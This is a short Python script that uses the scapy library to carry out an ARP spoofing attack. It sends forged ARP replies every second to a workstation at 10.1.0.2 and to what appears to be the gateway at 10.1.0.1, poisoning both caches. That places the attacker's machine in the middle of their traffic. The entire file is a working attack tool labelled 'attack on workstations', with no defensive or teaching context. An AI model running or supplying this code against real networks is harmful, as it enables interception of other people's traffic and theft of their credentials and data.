import time
import scapy.all as scapy


def attack(target, spoof):
    print("Attack launched, stop with CTRL+C")
    try:
        while True:
            scapy.send(scapy.ARP(op=2, pdst=target, hwdst=scapy.getmacbyip(target), psrc=spoof))
            scapy.send(scapy.ARP(op=2, pdst=spoof, hwdst=scapy.getmacbyip(spoof), psrc=target))
            time.sleep(1)
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    # attack on workstations
    attack("10.1.0.2", "10.1.0.1")
    #attack("10.1.0.3", "10.1.0.1")
